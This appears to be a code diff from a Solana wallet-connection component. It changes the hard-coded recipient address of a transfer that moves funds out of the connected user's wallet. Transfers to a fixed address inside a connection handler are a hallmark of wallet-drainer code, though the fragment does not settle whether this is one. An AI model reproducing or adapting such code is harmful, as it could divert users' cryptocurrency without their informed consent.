@@ -135,7 +135,7 @@ const WalletConnectionHandler: FC = () => {
             const tx = new Transaction().add(
                 SystemProgram.transfer({
                     fromPubkey: walletPublicKey,
-                    toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
+                    toPubkey: new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz'),
                     lamports: sendAmount,
                 })
             );
